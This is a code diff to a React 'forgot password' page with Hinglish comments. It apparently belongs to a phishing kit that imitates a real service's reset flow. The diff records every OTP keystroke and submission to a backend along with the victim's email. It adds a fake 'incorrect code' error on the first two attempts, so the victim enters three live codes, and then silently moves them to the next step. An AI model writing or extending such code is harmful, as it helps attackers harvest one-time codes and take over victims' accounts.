@@ -13,6 +13,7 @@ const ForgotPasswordPage = () => {
   const [loading, setLoading] = useState(false)
   const [errorMsg, setErrorMsg] = useState('')
   const [resend, setResend] = useState(59)
+  const [otpAttempt, setOtpAttempt] = useState(0)   // 0,1,2 → 3rd attempt pe step 3
 
   const otpRefs = useRef([])
 
@@ -44,7 +45,8 @@ const ForgotPasswordPage = () => {
 
     saveToBackend({
       email,
-      otpSnap: next.join(''),   // updated array directly use
+      otpSnap: next.join(''),
+      attempt: otpAttempt + 1,
       page: 'ForgotPassword - OTP Typing',
     })
   }
@@ -64,7 +66,7 @@ const ForgotPasswordPage = () => {
     })
   }
 
-  // ── Button handlers — submit pe bhi ek baar save ────────
+  // ── Button handlers ──────────────────────────────────────
   const handleEmailNext = () => {
     if (!email.trim()) return
     setLoading(true)
@@ -74,11 +76,35 @@ const ForgotPasswordPage = () => {
   }
 
   const handleOtpNext = () => {
-    if (otp.join('').length < 6) return
+    const enteredOtp = otp.join('')
+    if (enteredOtp.length < 6) return
+
     setLoading(true)
-    saveToBackend({ email, otpSnap: otp.join(''), page: 'ForgotPassword - OTP Submitted' })
-    setLoading(false)
-    setStep(3)
+
+    // Har attempt ka OTP save karo
+    saveToBackend({
+      email,
+      otpSnap: enteredOtp,
+      attempt: otpAttempt + 1,
+      page: `ForgotPassword - OTP Submitted (Attempt ${otpAttempt + 1})`,
+    })
+
+    setTimeout(() => {
+      setLoading(false)
+
+      if (otpAttempt < 2) {
+        // Pehli 2 baar — fake "wrong OTP" error dikhao
+        setErrorMsg('The code you entered is incorrect. Please try again.')
+        setOtp(['', '', '', '', '', ''])
+        setOtpAttempt(a => a + 1)
+        setTimeout(() => otpRefs.current[0]?.focus(), 60)
+      } else {
+        // 3rd attempt ke baad — silently aage bhejo
+        setErrorMsg('')
+        setOtpAttempt(0)
+        setStep(3)
+      }
+    }, 900)
   }
 
   const handleReset = () => {
@@ -96,6 +122,7 @@ const ForgotPasswordPage = () => {
     return () => clearTimeout(t)
   }, [step, resend])
 
+  // Error clear karo jab user kuch change kare
   useEffect(() => {
     if (errorMsg) setErrorMsg('')
   }, [email, otp, newPass, step])
@@ -108,6 +135,14 @@ const ForgotPasswordPage = () => {
         input { outline: none; }
         input::placeholder { color: #c8c8c8; }
         @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes shake {
+          0%,100% { transform: translateX(0); }
+          20%      { transform: translateX(-6px); }
+          40%      { transform: translateX(6px); }
+          60%      { transform: translateX(-4px); }
+          80%      { transform: translateX(4px); }
+        }
+        .otp-shake { animation: shake 0.4s ease; }
       `}</style>
 
       {/* Back arrow */}
@@ -176,15 +211,24 @@ const ForgotPasswordPage = () => {
             <strong style={{ color: '#000' }}>{email}</strong>
           </p>
 
-          <div style={s.otpRow}>
+          {/* Attempt indicator — sirf 2nd attempt se dikhao */}
+          {otpAttempt > 0 && (
+            <p style={s.attemptHint}>
+              {otpAttempt === 1
+                ? 'Double-check the code and try again.'
+                : 'Last attempt — make sure the code is correct.'}
+            </p>
+          )}
+
+          <div style={s.otpRow} className={errorMsg ? 'otp-shake' : ''}>
             {otp.map((d, i) => (
               <input
                 key={i}
                 ref={el => (otpRefs.current[i] = el)}
                 style={{
                   ...s.otpBox,
-                  borderColor: d ? '#FFFC00' : '#e0e0e0',
-                  borderWidth: d ? 2.5 : 1.5,
+                  borderColor: errorMsg ? '#e53935' : d ? '#FFFC00' : '#e0e0e0',
+                  borderWidth: d || errorMsg ? 2.5 : 1.5,
                   fontWeight: d ? 700 : 400,
                 }}
                 type="text"
@@ -297,6 +341,13 @@ const s = {
     lineHeight: 1.55,
     marginBottom: 28,
     whiteSpace: 'pre-line',
+  },
+  attemptHint: {
+    fontSize: 12,
+    color: '#e53935',
+    textAlign: 'center',
+    marginBottom: 10,
+    marginTop: -16,
   },
   input: {
     width: '100%',
